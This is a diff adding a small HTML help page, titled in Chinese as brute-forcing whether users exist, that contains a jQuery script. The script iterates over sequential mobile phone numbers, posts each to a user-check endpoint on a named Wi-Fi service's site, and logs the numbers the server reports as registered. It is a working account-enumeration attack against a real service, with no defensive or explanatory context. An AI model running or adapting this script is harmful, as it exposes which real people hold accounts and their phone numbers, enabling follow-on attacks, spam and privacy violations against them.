@@ -1,0 +1,22 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN">
+<HTML>
+<HEAD>
+<META http-equiv="Content-Type" content="text/html; charset=gb2312">
+<META name="GENERATOR" content="QuickCHM">
+<TITLE>刷用户是否存在</TITLE>
+</HEAD>
+<BODY>
+<P>刷用户是否存在</P>
+<P>var i = 0;<BR>var path = "<A 
+href="http://www.jlzwifi.com/%E7%94%A8%E6%88%B7/%E7%94%A8%E6%88%B7%E6%A3%80%E9%AA%8C">http://www.jlzwifi.com/%E7%94%A8%E6%88%B7/%E7%94%A8%E6%88%B7%E6%A3%80%E9%AA%8C</A>";<BR>var 
+tel = 15800005800;<BR>for(;i&lt;100;i++){<BR>&nbsp;tel+=1;<BR>&nbsp;var stop = 
+false;<BR>&nbsp;function gettel(t){<BR>&nbsp;&nbsp;var teln = 
+t;<BR>&nbsp;&nbsp;$.ajax({<BR>&nbsp;&nbsp;&nbsp;type: 
+'POST',<BR>&nbsp;&nbsp;&nbsp;url: path,<BR>&nbsp;&nbsp;&nbsp;dataType: 
+'json',<BR>&nbsp;&nbsp;&nbsp;data:{"username":teln},<BR>&nbsp;&nbsp;&nbsp;success: 
+function(responseText) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;if(responseText.状态说明 == 
+"用户已存在"){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(teln);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stop 
+= 
+true;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;});<BR>&nbsp;};<BR>&nbsp;gettel(tel);<BR>}</P>
+</BODY>
+</HTML>
